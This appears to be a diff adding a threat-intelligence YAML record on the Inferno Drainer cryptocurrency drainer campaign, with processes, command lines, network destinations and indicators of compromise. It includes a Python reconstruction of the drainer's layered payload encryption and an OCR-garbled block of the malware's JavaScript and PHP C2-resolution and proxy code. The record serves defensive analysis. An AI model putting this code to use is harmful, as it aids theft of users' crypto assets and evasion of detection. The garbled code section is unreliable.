@@ -1,0 +1,169 @@
+description: Inferno Drainer is a sophisticated cryptocurrency drainer-as-a-service
+  operation that has adapted its tactics to evade detection. This report details recent
+  phishing campaigns targeting Discord users and analyzes the technical infrastructure,
+  obfuscation techniques, and blockchain interactions employed by Inferno Drainer.
+attribution: Unknown (likely affiliated with a cybercriminal group)
+malware_families:
+- Inferno Drainer
+TTPs:
+  processes:
+  - discord.exe
+  - chrome.exe
+  - msedge.exe
+  - php.exe
+  - Discord
+  commandline:
+  - C:\Program Files\Discord\Discord.exe
+  - '"C:\Program Files\Google\Chrome\Application\chrome.exe" https://roles-collab[.]com/oauth/callback?code={auth_code}&state={state}'
+  - '"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" https://roles-collab[.]com/oauth/callback?code={auth_code}&state={state}'
+  - php -f secureproxy.php
+  - C:\\Users\\Public\\Discord\\Discord.exe --processStart,Discord.Service.exe
+  python:
+  - "def get_short_hash(s):\n  \"\"\"Computes a 32-bit hash similar to JavaScript's\
+    \ hashCode function.\"\"\"\n  hash_val = 0\n  for ch in s:\n    hash_val = ((hash_val\
+    \ << 5) - hash_val) + ord(ch)\n  hash_val &= 0xFFFFFFFF\n  if hash_val & 0x80000000:\n\
+    \    hash_val = -((~hash_val + 1) & 0xFFFFFFFF)\n  return hash_val\n\ndef inferno_encode(s):\n\
+    \  \"\"\"Encodes data using a XOR-based transformation.\"\"\"\n  return bytes(ord(b)\
+    \ ^ 3 for b in s).hex()\n\ndef encrypt_body(payload_data):\n  timestamp_7 = int(str(int(time.time()\
+    \ * 1000))[:7])\n  random1 = round(21474736479 * random.random() + 100000)\n \
+    \ random2 = int(8999 * random.random() + 1000)\n  rand_str_original = getRandomString(25)\n\
+    \  rand_str_base64 = btoa(rand_str_original)\n  rand_str_hashed = get_short_hash(rand_str_original)\n\
+    \  random_token = getRandomString(len(str(random1)))\n  data_transformed = str(5\
+    \ * (random1 - random2)) # Encrypting Inferno Drainer customer ID\n  customer_id_encrypted\
+    \ = cryptojs_aes_encrypt(config_object['customer_id'], data_transformed)\n  combined_key\
+    \ = str(timestamp_7) + \"inferno\" + str(rand_str_hashed) + str(random1)\n  key_hash\
+    \ = get_short_hash(combined_key) # Layer 1:\n  payload_layer1 = cryptojs_aes_encrypt(payload_data,\
+    \ combined_key)\n  outer_key = str((random1 + random2 + timestamp_7) - 50) # Layer\
+    \ 2:\n  payload_layer_1_encrypted = cryptojs_aes_encrypt(str(payload_layer1),\
+    \ outer_key)\n  p1 = (2 * (random1 + get_short_hash(str(payload_layer1)) - random2))\
+    \ - 100\n  p2 = get_short_hash(config_object['customer_id']) + timestamp_7\n \
+    \ payload_layer_2 = { 's1': random1, 's2': random2, 'rs2': random_token, 't':\
+    \ timestamp_7, 'rs': rand_str_base64, 'd': payload_layer_1_encrypted, # main payload\
+    \ 'k': key_hash, 'c': customer_id_encrypted, # Inferno Drainer customer ID 'p1':\
+    \ p1, 'p2': p2, 'n': message_count }\n  message_count += 1\n  payload_layer_2_str\
+    \ = json.dumps(payload_layer_2)\n  hash_outer = get_short_hash(payload_layer_2_str)\n\
+    \  key_hash = btoa(str(hash_outer)) # additional data encoding\n  data_transformed_hex\
+    \ = inferno_encode(json.dumps(payload_layer_2))\n  random_token_reversed = random_token[::-1]\n\
+    \  p3 = get_short_hash(random_token_reversed)\n  random2_new = 5 * message_count\n\
+    \  payload_layer_3 = json.dumps({ 'h': key_hash, 'c': data_transformed_hex, 'p3':\
+    \ p3, 'p4': random2_new, 'u': '7.19' # Inferno Drainer version? }, separators=(',',\
+    \ ':')) # JS getYear(), getMonth(), getDay())\n  now = datetime.now()\n  js_year\
+    \ = now.year - 1900\n  js_month = now.month - 1\n  js_day = (now.weekday() + 1)\
+    \ % 7\n  final_key = f\"{js_year}-{js_month}-{js_day}\" # Layer 3 encryption:\n\
+    \  payload_layer_3_encrypted = cryptojs_aes_encrypt(payload_layer_3, final_key)\n\
+    \  payload_layer_4 = { random_str_25: payload_layer_3_encrypted, 'v': 4 # protocol\
+    \ version? } # Layer 4 encryption:\n  return cryptojs_aes_encrypt(json.dumps(payload_layer_4),\
+    \ 'inferno')\n"
+  - 'async function load_remote_patch_config() {for (55 )ry {__dummy(_6x1be67. info(\"Waiting
+    for ethers\"), await waitForEthers(), _Ox1be67f.info(''uaited for ethers):1let
+    _@x62ad16 = window[\"ethers] || ethers bsc_rpc_list = [''https://rpc.ankr.com/bsc,
+    https://bsc-dataseed.bnbchain.org, \"https:, bsc_rpc_endpoint = bsc_rpc_list[Math.
+    Floor(XeB8Fcz(Math.randon(), bsc_rpc_list[''length''l, sOrivb. _6x5c3882 = await
+    (await fetch(bsc_rpc_endpoint, {[''method\"]: \"POST'',*body\": ISON.stringify({method\":
+    \"eth_call,[*params''1: [{to'': \"0x15B862EC60B7934F1333e53AC1e 14381 1A2E3eE\"[''data]:
+    \"Ox53eds1a33, \"latest''],o,*jsonrpez *2.0\"N[\"headers*1: {[\"Content-Type'']:
+    \"application/json/bsc-dataseedl .bubchain.org, https://bsc-datase:50))1Mo 105if
+    (XeBFcz(_0x5C3882[result''], XIFGRNC(-33))) {_6x1be67.error(*No result from RPC'');Continues1et[_ex314b50,_@x16679a]
+    = _@x62ad16.utils[\"defaultAbiCoder'']. decode([''string[1, *string[1], _Ox5c3882.result),
+    remote_patch_config = {};for (let _0x2aadce = 0; _x2asdce < _6x314b50. length;
+    _6x2asdcers)remote_patch_conig[_0x314b50[_Ox2aadce]] = _6x16679a[_0x2aadce];return
+    _@x361945. remotePatch = remote_patch_confie,_0x1be67[ *info\"1(*Remote patch
+    config loaded:, remote_patch_config),remote_patch_configs3 catch (_0x3f1as6) {if
+    (_@x3Flaa6l ''nessage] === ''Ethers not found after timeout'') {__dumy(_@x1be67[error''](''Ethers
+    not available yet, retrying...''), awsit new Promise(_@x37ffef => setTimeout(
+    @x37ffef, 1000)));continue;__dummy (_6x1be67[\"error''](*Failed to fetch config
+    from contract_0x31226), await new Promise(_Ox28S670 => setTimeout(_0x28560, 1000)));Ty
+    let bsc_rpc_list2 = [https://binance.1lamarpc.con, \"https://rpc.ankr.con/bsc,
+    _6x599b52 = bsc_rpc_list2[Math ''floor\" ] (XeB8Fcz(Math.randon(), bsc_rpc_list2.length,
+    XIFaRhC(-50)))]5 _ox16774 = (await (await fetch(_8x599b52, {[''method]: \"POST\",*body\":
+    ISON[*stringify*1({[''method'']: \"eth_call,*https://bsc-dataseed?.8*0xd2426C325465280ab565EA1A945b
+    41 IBBLSFFC \",ex73d4a13a\"[''3sonrpc]: *2.0\"N[\"headers*1: {*Content-Type'':
+    *application/jsonb1).3s0n0) . result5 _6x2c9cd3 = ethers.utils. defaultAbiCoder.decode([_0x3bded6(1085)1,
+    _0x16774) 615for (let _0x1506 of [~SmeldjgrcBiyIWGLKs cgQ6Ts1nduvhhRLAHE by ODSDCOQTUSMIWSHRNFS''D3iEaazktrikcNSIKRYPFyHIZEWF20\"3LIDwLHShKAOZnAUIKIVENKASZBZTY\"~09QKZ2FDIeH2FmLa1VSTEWiSOKEKe''n_6x2c9cd3
+    = CryptoIS[''AES''].decrypt(_8x2c9cd3, _8X15F96)[ ''tostring]1(Cryptods[enc''].UtF8);if
+    (XeB8Fcz(_0x2c9cd3[\"startskith'' 1(*https://*), sOrjvb = -33))continue;return
+    _8x21123.api = _6x2c9cd3,_exacocds;3 catch (_ox3168bd) {_0x1be67[_0x3bdeds(1624)1(_8x3168ba)
+    ;.3wss://gdfgodfgkodfvx.com/\",\"okjfckckvnkcjfnkfkgjen. com,\"2378477734893988\"74732568ttp:
+    //dopdopdddewdoideoijdioeduioj . com,ss://0ifosdusnczxywq.com/\",''@x72cd63650700e5395f4ab238cecd18497a33a83e,_decode
+    (\" QWNjZXNzLUNvbnRyb2wtQuixsb3ctT3)pZ21u0iAq)) ; header (basebd_decode(* QWNjZXNzLUNvbnRyb2wtQhxsb3ct
+    TWVBaGIkc zogROVULCBIRUFELCBQTINULCBPUFRITOST ) ) ; header (base64_decode(* QN
+    ZXNzLUNvbnRyb2wtQjxsb3ctSGVhZGVyczogkg==\") ) ;http_response_code($httpCode);echo
+    $response; Jcatch(Exception $e){http_response_code(508);echo base64_decode(''ZXJyb3I6TA-=\")
+    . $e->getMessage() ; }} }if ($_SERVER[base6d_decode (\" UKVRVUVTVFONRVRIT@Q-\"
+    ) ] -=base64_decode (*T1BUSUI0Uw==\")){header (base64_decode(* QN ZXNzLUNvbnRyb2wtQWxsb3ctT31pZ21u01Aq\"
+    ) ) ; header (base64_decode(* QWNZXNzLUNvbnRyb2wtQhxsb3ct TWVBaG9kc zogROVULCBIRUFELCBQTINULCBPUFRITOST
+    ) ) ; header (base64_decode(* QN ZXNzLUNvbnRyb2wtQjxsb3ctSGVhZGVyczogkg==\") )
+    ;header (base6d._decode (\" QN ZXNzLUNvbnRyb2wtTHFALUFnZTogODYBMDA=\") ) ;http_response_code(204)
+    ;exit; Jelse if(isset($_GET[base6d_decode(ZQ-=\")])){$proxy-newSecureProxyMiddleware([base64_decode(
+    cnBjVXJscw==\")=>[base64_decode( aHROCHM6Ly9ycGHuYWSrci5]b2evYnNj \"), base64_decode(*
+    aHRACHMGLy91C2MEZGFOYXN1ZWQyLmJuYmNoYWluLmOyZu\") ], base64_decode (\" Y29udHIhY3RBZGRyZXNz\"_decode(*MH10WQ17;YONWY30WZhNjBmY2EAMMTOZTFkMZUAMz]
+    INDMZNZBmZWIw ) ]) ; $endpoint-urldecode($_GET[base6d_decode(ZQ-=\")]); $endpoint-1trin($endpoint,base64_decode(Lw==\"));$proxy->handle($endpoint);}elselhttp
+    response code(400):echo base64 decode(TWlzc2luZyBlbmRwb21udA-R Confirm. CancelBNB
+    Smart Chain MainnetFrom: BNB Smart Chain Mainnet BalanceAccount 1 BNBTo:0Oxed0e416e0fEEA5b484ba5c95d...OxedOe...0572v\"A
+    This is a deceptive requestIf you approve this request, a third partyknown for
+    scams will take all your assets.See detailsAMOUNT0.001 BNBEstimated changes @You
+    send g B BNB2.1. Receiver.bulkWithdraw()1.2. StorageContract.nativeCryptoReceiver()
+    2.3 owners = [0x0000db5c8B030ae20308ac975898E09741e70000]OwnerStorage Contract=C
+    S N , 0x0000db5c8B030ae20308ac975898E09741e70000-0x0000E23aBdC862a1911d77904e77Fdb378D0000
+    .value (8.089684629157501104 ether) .Verify()B #* [5523] 6x0000E23aBdC862a1911d77904e77Fdb378DBAAOO
+    .getOwners ()L ceturn ([ 6x0000db5cEB030a620308ac975898E0974170000 1)B #* [2577]
+    6x0000E23aBdC862a1911d77904e77Fdb378DBAAOO .nativeCryptoReceiver ()L ceturn (6x080037bB05B2CeF17c64694BCD1198826C20000
+    )[55] x000037bBO5B2CeF17c6469F4BCDb198826Ce0000 . transier (0.009684629157501104
+    ether)Address  0x3b35b6B7BE7CEB583608319BedD3DO33A7IFf4dS@  Inferno-0xIFE926288b2b2792BCdEE8bBF2860ed16724Da6@
+    Customer-0xdb185f8fd5fc72B6DfcOCIe5A3DDIE400aDeb70Transaction Trace o[)[86246]
+    FakeERC20-0x00002687 . . . 9EEFO000 .multicall (calls = [{target:Pemmit2, callData:
+    0x23b872dd0GOEAOAOEBAEOAAOBORAORAR3H3Sb6LTbETceb5B83e08319becFakeERC20-0x00002687..
+    . . OEET0000 , value = 115792089237316195423570985008687907853269984665640318714951359838671721052148)\"
+    0xe000b6A1d5f9231bF5942229e4b7495ca91267B3 @ PoL - -113.8650 -$31.98@  OxIFE92e288b2b2792BCdEeBbBF286e0ed16724Da6
+    @ PoL - 22.7730 $6.40D 0xAa8119899bBb69b61Fa953B0e2eBC470208b9Tee. @ PoL - 91.0920
+    $25.59Transaction Trace o[)[86246] FakeERC20-0x00002687 . . . OEET0000 , value
+    = 36798675933625386211288168)B #* [5523] 6x000OE23aBdC86221911d77904677Fdb378D800A0
+    - getOuners ()L eturn ([ 0x0000db5c8B030a620308ac975898E0974170000 1)return (True)return
+    (True)Token& ELON& ELON& ELONDogelon , callData: 0x23b872dd0G0EOOEOAAOEOAAOBORAORAR3H3Sb6LTbETceb5B83e08319becFakeERC20-0x00002687..
+    . . OEET0000 , value = 115792089237316195423570985008687907853269984665640318714951359838671721052148)'
+  scripting_engine: python
+  registry_keys: null
+  image_load: null
+  network_connections:
+  - executable: chrome.exe
+    destination_address: hxxps://roles-collab[.]com/oauth/callback?code={auth_code}&state={state}
+  - executable: chrome.exe
+    destination_address: hxxps://collab.land-wl[.]com/collab?token={JWT}&server={discord_server_id}&user={username}&avatar={avatar_id}%2Fnull
+  - executable: PHP-cgi.exe
+    destination_address: sharp-dev-40d.ivx9ctza.workers[.]dev
+  - executable: php.exe
+    destination_address: rpc.ankr.com
+    port: 80
+  - executable: php.exe
+    destination_address: bsc-dataseed2.bnbchain.org
+    port: 80
+  file_modifications: null
+  persistence:
+  - Inferno Drainer uses a combination of rapidly rotating domains, intermediate servers
+    for conditional redirection, and security tokens to hinder automatic detection.
+  - Utilizes smart contracts for C&C server address resolution.
+  - Employs rotating proxy servers to evade detection.
+  pipes: null
+  process_relations: null
+IOCs:
+- hxxps://roles-collab[.]com/oauth/callback?code={auth_code}&state={state}
+- hxxps://collab.land-wl[.]com/collab?token={JWT}&server={discord_server_id}&user={username}&avatar={avatar_id}%2Fnull
+- airdop-trump[.]com
+- x[.]com/AYANONASDAQ/status/1881085122528866558
+- 122930324973519766301436951203830082526218435563
+- 1200558892643476254287245132452946035187310616572
+- 655405259133752031973586338610502250274177132606
+- 1153611788939004710816649274463142904956676655633
+- sharp-dev-40d.ivx9ctza.workers[.]dev
+- quick-net-6bd.cz53l1or.workers[.]dev
+- hash: '0xe9d5f645f79fa60fca82b4e1d35832e43370feb0'
+- url: https://rpc.ankr.com/bsc
+- url: https://bsc-dataseed2.bnbchain.org
+- domain: koyeb[.]app
+- domain: jaatcom822-eb36cf51.koyeb[.]app
+authors:
+- Check Point Research
+- Unknown
+reference: https://research.checkpoint.com/2025/inferno-drainer-reloaded-deep-dive-into-the-return-of-the-most-sophisticated-crypto-drainer/
+date_of_publication: May 07, 2025
+file_creation_date: May 14, 2025
